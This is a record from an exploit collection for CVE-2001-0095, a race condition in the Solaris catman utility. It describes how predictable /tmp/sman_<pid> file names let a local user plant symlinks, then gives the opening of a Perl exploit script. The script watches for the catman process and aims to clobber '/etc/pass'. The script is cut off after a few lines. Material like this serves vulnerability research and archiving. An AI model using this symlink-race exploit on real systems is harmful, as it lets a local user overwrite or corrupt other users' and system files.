    "text": "ecve : CVE-2001-0095 ， title : Solaris 2.x/7.0/8 - 'Catman' Race Condition ( 2 ) - Solaris local Exploit ， verified : Verified ， exploit_detail : source :  ， catman is a utility for creating preformatted man pages , distributed as part of the Solaris Operating Environment. A problem exists which could allow local users to overwrite or corrupt files owned by other users. ， The problem occurs in the creation of temporary files by the catman program. Upon execution , catman creates files in the /tmp directory using the file name sman_<pid> , where pid is the Process ID of the running catman process. The creation of a symbolic link from /tmp/sman_<pid> to a file owned and writable by the user executing catman will result in the file being overwritten , or in the case of a system file , corrupted. This makes it possible for a user with malicious intent to overwrite or corrupt files owned by other users , and potentially overwrite or corrupt system files. The Sun BugID for this issue is 4392144. ，  #  ! /usr/local/bin/perl -w ，  # The problem is catman creates files in /tmp insecurly. They are based on the PID of the catman ，  # process , catman will happily clobber any files that are symlinked to that file. ，  # The idea of this script is to watch the process list for the catman process ,  ，  # get the pid and Create a symlink in /tmp to our file to be ，  # clobbered. This exploit depends on system speed and process load. ，  # This worked on a patched Solaris 2.7 box ( August 2000 patch cluster )  ，  # SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW , Ultra-1 ，  # lwc @ vapid.betteros.org 11/21/2000 Vapid Labs. ，  $ clobber = \"/etc/pass\" ;  ， open ps , \"ps -ef | grep -v grep | grep -v PID | \" ;  ，  @ args = split \" \" ,  $ _ ; ",
